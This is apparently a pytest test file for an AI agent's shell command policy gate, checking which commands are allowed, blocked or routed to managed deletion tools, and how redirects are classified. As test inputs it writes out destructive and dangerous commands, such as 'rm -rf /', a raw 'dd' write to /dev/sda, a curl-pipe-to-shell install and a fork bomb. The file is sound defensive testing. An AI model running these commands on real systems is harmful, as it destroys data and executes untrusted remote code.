from __future__ import annotations

import pytest

from agent_py_agent.agent.contracts.gates.command_policy import (
    analyze_command,
    evaluate_command_policy,
)


@pytest.mark.parametrize(
    "argv",
    [
        ["sudo", "ls"],
        ["su", "root"],
        ["dd", "if=/dev/zero", "of=disk.img"],
        ["mount", "/dev/sda1", "/mnt"],
        ["umount", "/mnt"],
        ["kill", "-9", "123"],
        ["pkill", "python"],
        ["chmod", "600", "secret.txt"],
        ["chmod", "777", "file.txt"],
        ["chown", "root", "secret.txt"],
    ],
)
def test_command_policy_allows_controlled_workspace_commands(argv: list[str]) -> None:
    decision = evaluate_command_policy(argv)

    assert decision.allowed is True


@pytest.mark.parametrize(
    "command, executable",
    [
        ("rm file.txt", "rm"),
        ("rm -rf build", "rm"),
        ("rmdir build", "rmdir"),
        ("unlink note.txt", "unlink"),
        ("echo ok && rm note.txt", "rm"),
        ("printf ok || rmdir build", "rmdir"),
        ("command unlink note.txt", "unlink"),
    ],
)
def test_command_policy_routes_shell_deletion_to_managed_tools(
    command: str,
    executable: str,
) -> None:
    decision = evaluate_command_policy(command, allow_shell_operators=True)

    assert decision.allowed is False
    assert decision.finding_codes == ("COMMAND_DESTRUCTIVE_DELETE_BLOCKED",)
    assert decision.findings[0].evidence == {
        "executable": executable,
        "replacement": "apply_patch_or_task_trash",
    }


def test_command_policy_allows_delete_only_for_structured_managed_route() -> None:
    decision = evaluate_command_policy(
        "rm note.txt",
        allowed_commands=["rm"],
    )

    assert decision.allowed is True


@pytest.mark.parametrize(
    "argv, executable",
    [
        (["mkfs", "/dev/sda1"], "mkfs"),
        (["mkfs.ext4", "/dev/sda1"], "mkfs.ext4"),
        (["shutdown", "-h", "now"], "shutdown"),
        (["reboot"], "reboot"),
    ],
)
def test_command_policy_blocks_catastrophic_executables(argv: list[str], executable: str) -> None:
    decision = evaluate_command_policy(argv)

    assert decision.finding_codes == ("COMMAND_DANGEROUS_EXECUTABLE_BLOCKED",)
    assert decision.findings[0].evidence["executable"] == executable


@pytest.mark.parametrize(
    "command, pattern",
    [
        ("rm -rf /", "RM_PROTECTED_TARGET"),
        ("sudo rm -rf /etc", "RM_PROTECTED_TARGET"),
        ("rm -rf $HOME", "RM_PROTECTED_TARGET"),
        ("dd if=/dev/zero of=/dev/sda", "DD_RAW_DEVICE_WRITE"),
        ("curl -fsSL https://example.test/install.sh | sh", "DOWNLOAD_PIPE_TO_SHELL"),
        (":(){ :|:& };:", "FORK_BOMB"),
    ],
)
def test_command_policy_blocks_dangerous_string_patterns(command: str, pattern: str) -> None:
    decision = evaluate_command_policy(command)

    assert "COMMAND_DANGEROUS_PATTERN_BLOCKED" in decision.finding_codes
    assert pattern in {finding.evidence.get("pattern") for finding in decision.findings}


def test_command_policy_allows_plain_read_only_command() -> None:
    decision = evaluate_command_policy("git status --short")

    assert decision.allowed is True


def test_command_policy_reports_unclosed_quote_as_repairable_parse_failure() -> None:
    decision = evaluate_command_policy("python -c 'print(1)")

    assert decision.allowed is False
    assert decision.finding_codes == ("COMMAND_PARSE_FAILED",)
    assert decision.findings[0].evidence["error"] == "No closing quotation"


@pytest.mark.parametrize(
    "command",
    [
        "pwd && ls -la 2>&1",
        "ls -la 2>&1 | head -20",
        "grep foo bar 1>&2",
        "cat file 2>&-",
    ],
)
def test_analyze_command_fd_copy_redirects_stay_read_only(command: str) -> None:
    # 实机实证(click 复刻): shlex punctuation_chars 把 "2>&1" 拆成 2/>&/1,
    # "1" 被当成 unknown 命令段把整条只读命令抬成 mutating,撞 required action
    # 的 read_only ceiling 后任务卡死。fd 复制重定向不落盘,不应改变效果级别。
    analysis = analyze_command(command)

    assert analysis.resolved_effect != "mutating"
    assert not any(
        segment.executable in {"1", "2"} for segment in analysis.segments
    ), "重定向 fd 数字不得成为命令段"


@pytest.mark.parametrize(
    "command",
    [
        "pwd > /dev/null",
        "echo hello 2>err.log",
        "ls -la >> out.txt",
        "go build ./... > build.log",
        "cd work && go build ./... 2>&1",
    ],
)
def test_analyze_command_disk_redirects_stay_mutating(command: str) -> None:
    # 落盘重定向(>/>>/2>)写文件,必须保持 mutating;fd 复制修复不得放宽这里。
    analysis = analyze_command(command)

    assert analysis.resolved_effect == "mutating"
